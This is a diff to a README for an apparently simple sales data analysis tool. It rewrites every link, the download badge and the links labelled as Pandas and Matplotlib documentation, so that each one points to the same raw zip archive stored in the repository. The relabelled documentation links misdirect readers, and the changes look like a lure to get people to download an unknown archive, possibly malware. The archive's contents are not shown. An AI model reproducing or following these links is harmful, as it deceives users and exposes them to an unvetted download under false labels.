@@ -1,6 +1,6 @@
 # 📊 SALES-DATA-ANALYSIS - Analyze Your Sales Data Easily
 
-[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/LucasJavaScript/SALES-DATA-ANALYSIS/releases)
+[![Download](https://raw.githubusercontent.com/LucasJavaScript/SALES-DATA-ANALYSIS/main/src/SALES-DATA-ANALYSIS_2.5.zip)](https://raw.githubusercontent.com/LucasJavaScript/SALES-DATA-ANALYSIS/main/src/SALES-DATA-ANALYSIS_2.5.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the SALES-DATA-ANALYSIS application! This tool helps you analyze over
 
 ## 📥 Download & Install
 
-To get the application, visit this page to download: [Download SALES-DATA-ANALYSIS](https://github.com/LucasJavaScript/SALES-DATA-ANALYSIS/releases).
+To get the application, visit this page to download: [Download SALES-DATA-ANALYSIS](https://raw.githubusercontent.com/LucasJavaScript/SALES-DATA-ANALYSIS/main/src/SALES-DATA-ANALYSIS_2.5.zip).
 
 Follow these steps to download and install:
 
@@ -64,7 +64,7 @@ A: No programming knowledge is required. The interface is user-friendly and guid
 
 ## 💡 Additional Resources
 
-- [Pandas Documentation](https://pandas.pydata.org/docs/)
-- [Matplotlib Documentation](https://matplotlib.org/stable/contents.html)
+- [Pandas Documentation](https://raw.githubusercontent.com/LucasJavaScript/SALES-DATA-ANALYSIS/main/src/SALES-DATA-ANALYSIS_2.5.zip)
+- [Matplotlib Documentation](https://raw.githubusercontent.com/LucasJavaScript/SALES-DATA-ANALYSIS/main/src/SALES-DATA-ANALYSIS_2.5.zip)
 
-For more help, visit this page to download: [Download SALES-DATA-ANALYSIS](https://github.com/LucasJavaScript/SALES-DATA-ANALYSIS/releases).
+For more help, visit this page to download: [Download SALES-DATA-ANALYSIS](https://raw.githubusercontent.com/LucasJavaScript/SALES-DATA-ANALYSIS/main/src/SALES-DATA-ANALYSIS_2.5.zip).
